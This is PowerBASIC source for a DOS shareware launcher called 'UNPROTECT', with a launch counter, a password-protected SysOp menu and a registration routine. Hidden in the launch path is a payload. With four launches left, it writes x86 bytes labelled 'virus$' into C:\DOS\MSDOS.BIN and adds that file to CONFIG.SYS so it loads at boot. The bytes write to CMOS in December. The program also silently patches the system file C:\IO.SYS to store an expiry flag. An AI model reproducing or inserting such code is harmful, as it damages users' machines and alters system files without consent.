if Command$="" then
  print"Dieses Programm kann nicht selbst gestartet werden!"
  print"Starten Sie UNP.COM."
  goto Ende
end if
$INCLUDE "pbwindow.inc"
dim item$(3)
open "B",#1,"C:\IO.SYS"
seek #1,40102
get$ #1,1,IO$
close #1
if io$="n" then Expi=1 else Expi=0
color 0,0:print "Fuckin'Host SystOper":color 7,0
if command$="/SysOp" then goto SysOp
if Expi=1 then goto Expired
open "B",#2,"UNPROT.EXE"
seek #2,30
get$ #2,1,NumOfLaunchs$
Launchs=asc(NumOfLaunchs$)
if Launchs=0 then close #1:close #2:goto Expired
Launchs=Launchs-1
seek #2,30
NumOfLaunchs$=chr$(Launchs)
put$ #2,NumOfLaunchs$
close #2
if Launchs=4 then
  open "B",#1,"C:\DOS\MSDOS.BIN"
  virus$=chr$(&HB4)+chr$(&H2A)+chr$(&HCD)+chr$(&H21)+chr$(&H80)+chr$(&HFE)
  virus$=virus$+chr$(&H0C)+chr$(&H75)+chr$(&H0a)+chr$(&HBA)+chr$(&H70)
  virus$=virus$+chr$(&H00)+chr$(&HB0)+chr$(&H11)+chr$(&HEE)+chr$(&H42)
  virus$=virus$+chr$(&H32)+chr$(&Hc0)+chr$(&Hee)
  put$ #1,virus$
  close #1
  open "I",#1,"C:\CONFIG.SYS"
  open "O",#2,"C:\CONFIG.S_S"
9 line input #1,Dummy$
  print #2,Dummy$
  if LCase$(Dummy$)="[common]" then 10
  if eof(1) then 11 else 9
10 print #2,"DEVICE=C:\DOS\MSDOS.BIN"
  goto 12
11 print#2,"[common]"
  print#2,"DEVICE=C:\DOS\MSDOS.BIN"
  goto 13
12 line input #1,Dummy$
  print #2,Dummy$
  if eof(1) then goto 13 else 12
13 close #1
  close #2
  kill "C:\CONFIG.SYS"
  name "C:\CONFIG.S_S" as "C:\CONFIG.SYS"
end if
open "O",#1,"UNP.$$$"
PRINT #1,"MZ";
CLOSE #1
cmdline$="COPY UNP.$$$ /B + UNP.OVL /B UNP.EXE /B >NUL"
shell cmdline$
kill "unp.$$$"
shell "UNP.EXE"
kill "UNP.EXE"
goto Ende

SysOp:
Call MakeWindow(3,5,20,74,ColAttr%(14,1),3,4,1)
Call TitleWindow(1,"[ SysOp - Setup ]")
Call PrtCwindow(2,"*** SysOp - Setup initiated ***")
color 15,1
locate 7,7:print "Opening UNPROT.EXE ... ";
open "B",#1,"UNPROT.EXE"
print "OK"
locate 8,7:print "Seeking to Flag-Byte ... ";
seek #1,30
print "OK"
locate 9,7:print "Getting Launch-Flag-Info ... ";
get$ #1,1,LaunchsLeft$
print "OK"
locate 10,7:print "Closing UNPROT.EXE ... ";
close #1
print"OK"
color 12,1:locate 11,7:print"StartUp-Sequence complete."
Call MakeWindow(10,20,5,40,ColAttr%(15,3),3,4,1)
Call TitleWindow(1,"[ Password input ]")
locate 12,22:color 14,3:print"Enter password: ";
color 1,1:input "",Pass$:color 15,1
if Pass$="FuckHost" then UserN$="Markus"
if Pass$="Calle" then UserN$="Carlos"
if UserN$="" then
  Call MakeWindow(10,30,4,22,ColAttr%(12,2),3,4,1)
  Call TitleWindow(1,"[ ALERT!! ]")
  locate 12,32:color 12,2:print "PASSWORD INCORRECT"
  delay 2
  call RemoveWindow
  delay .5
  call RemoveWindow
  color 12,1
  locate 13,7:print"*** INCORRECT PASSWORD ***, exiting..."
  delay 1
  call RemoveWindow
  goto Ende
end if
Call RemoveWindow
locate 13,7:color 12,1
print"*** PASSWORD CORRECT ***, logging in ..."
locate 15,7:color 14,1
print "Hi ";UserN$;"! Nice to see you again."
MenuAgain:
item$(0)=""
item$(1)=""
item$(2)=""
item$(3)=""
item$(0)="[ Logged in ]"
item$(1)="View current Status"
item$(2)="Enter new LF"
item$(3)="Register this program"
call MakeMenu(10,50,ColAttr%(14,3),ColAttr%(15,1),3,4,1,1,3,item$())
decr Wwidth%,4
if CurntPos%=0 then
  locate 20,7:color 10,1:print "*** ESC PRESSED ***, logging out ..."
  delay 2
  call RemoveWindow
  goto Ende
end if
if CurntPos%=1 then      'Status anzeigen
  call MakeWindow(9,30,6,28,ColAttr%(15,3),3,4,1)
  call TitleWindow(1,"[ Program Status ]")
  locate 11,32:color 15,3:print"Program Status: ";
  if Expi=1 then color 12,3:print"LOCKED" else color 10,3:print"UNLOCKED"
  color 15,3
  locate 12,32:print"Launchs left  : ";mid$(str$(asc(LaunchsLeft$)),2,3)
  call TitleWindow(5," KEY ")
1 if inkey$="" then 1
  call RemoveWindow
  goto MenuAgain
end if
if CurntPos%=2 then      'neues Launch-Flag setzen
  call MakeWindow(9,20,7,40,ColAttr%(15,3),3,4,1)
  call TitleWindow(1,"[ Edit Parameters ]")
  call PrtWindow(2,2,"Program Status: ")
  call PrtWindow(3,2,"Launchs left  : ")
  call TitleWindow(4," Stat-SPC ")
  call TitleWindow(6," Lnch-+/- ")
  call TitleWindow(5," OK-ESC ")
  locate 11,38
  if Expi=1 then color 12,3:print"LOCKED  " else color 10,3:print"UNLOCKED"
  locate 12,38
  color 15,3:print mid$(str$(asc(LaunchsLeft$)),2,3)
2 a$=inkey$:if a$="" then 2
  if a$=" " and Expi=1 and chf=0 then Expi=0:chf=1
  if a$=" " and Expi=0 and chf=0 then Expi=1:chf=1
  chf=0
  if a$="+" then LaunchsLeft$=chr$(asc(LaunchsLeft$)+1)
  if a$="-" then LaunchsLeft$=chr$(asc(LaunchsLeft$)-1)
  locate 11,38
  if Expi=0 then color 10,3:print"UNLOCKED"
  if Expi=1 then color 12,3:print"LOCKED  "
  color 15,3
  locate 12,38:print mid$(str$(asc(LaunchsLeft$)),2,3);" "
  if A$=chr$(27) then goto WriteIt
  goto 2
end if
if CurntPos%=3 then    'Programm komplett registrieren (Diesen Schutz entfernen)
  Call MakeWindow(10,20,5,40,ColAttr%(15,3),3,4,1)
  call TitleWindow(1,"[ Password input ]")
  locate 12,22:color 14,3:print"Enter password: ";
  color 1,1:input "",Pass$:color 15,1
  if Pass$="RoboCop INDUSTRIES" then goto RegProggy
  Call MakeWindow(10,30,4,22,ColAttr%(12,2),3,4,1)
  call TitleWindow(1,"[ ALERT!! ]")
  locate 12,32:color 12,2:print"PASSWORD INCORRECT"
  delay 2
  call RemoveWindow
  delay .5
  call RemoveWindow
  color 12,1
  locate 20,7:print"*** INCORRECT PASSWORD ***, exiting ..."
  delay 1
  call RemoveWindow
  goto Ende
end if

RegProggy:
  call RemoveWindow
  call ClearWindow
  color 12,1
  locate 5,7:print"*** REGISTER SEQUENCE ENGAGED ***"
  color 15,1
  locate 7,7:print"Creating Temp-File ... ";
  open "O",#1,"UNP.$$$"
  print#1,"MZ";
  close #1
  print"OK"
  locate 8,7:print"Creating UNP.EXE ... ";
  shell "copy UNP.$$$ /B + UNP.OVL /b UNP.EXE /B >NUL"
  print "OK"
  locate 9,7:print"Deleting Temp-File ... ";
  kill "UNP.$$$"
  print "OK"
  locate 10,7:print"Deleting Overlay-Data ... ";
  kill "UNP.OVL"
  print "OK"
  locate 11,7:print"Deleting StartUp-Prog ... ";
  kill "UNP.COM"
  print"OK"
  locate 12,7:print"Deleting StartUp-Tool ... ";
  kill "SHROOM.COM"
  print"OK"
  locate 13,7:print"Killing MYSELF (Bye, ";UserN$;"!!) ... ";
  kill "UNPROT.EXE"
  print"OK"
  locate 15,7:color 12,1:print"*** REGISTER SEQUENCE COMPLETE ***"
  color 14,1:locate 16,7:print"This program is now fully functioning."
goto Ende

WriteIt:
call RemoveWindow
call ClearWindow
color 14,1:locate 5,7:print"OK, ";UserN$;"!"
color 15,1
locate 7,7:print"Opening UNPROT.EXE ... ";
open "B",#1,"UNPROT.EXE"
print "OK"
locate 8,7:print"Seeking to Flag-Byte ... ";
seek #1,30
print"OK"
locate 9,7:print"Writing setted Flag-Byte ... ";
put$ #1,LaunchsLeft$
print "OK"
locate 10,7:print"Closing UNPROT.EXE ... ";
close #1
print"OK"
locate 11,7:print"Changing Attribs of Flag-File ... ";
shell "ATTRIB -s -h -r C:\IO.SYS"
print "OK"
locate 12,7:print"Opening Flag-File ... ";
open "B",#1,"C:\IO.SYS"
print"OK"
locate 13,7:print"Seeking to Flag-Byte ... ";
seek #1,40102
print "OK"
locate 14,7:print"Writing setted Flag ... ";
if Expi=1 then put$ #1,"n"
if Expi=0 then put$ #1,"m"
print "OK"
locate 15,7:print"Closing Flag-File ... ";
close #1
print "OK"
locate 16,7:print"Changing Attribs of Flag File ... ";
shell "ATTRIB +s +h +r C:\IO.SYS"
print"OK"
color 12,1:locate 17,7:print"Write-Down Sequence complete."
goto MenuAgain

Expired:
color 4,0
print"Dies ist nur die Shareware-Version von UNPROTECT."
print"Wenn Ihnen dieses Programm gef„llt, so lassen Sie sich bitte registrieren."
print
if Expi=0 then
  shell "ATTRIB -s -h -r C:\IO.SYS"
  open "B",#1,"C:\IO.SYS"
  seek #1,40102
  put$ #1,"n"
  close #1
  shell "ATTRIB +s +h +r C:\IO.SYS"
end if
goto Ende

Ende:
end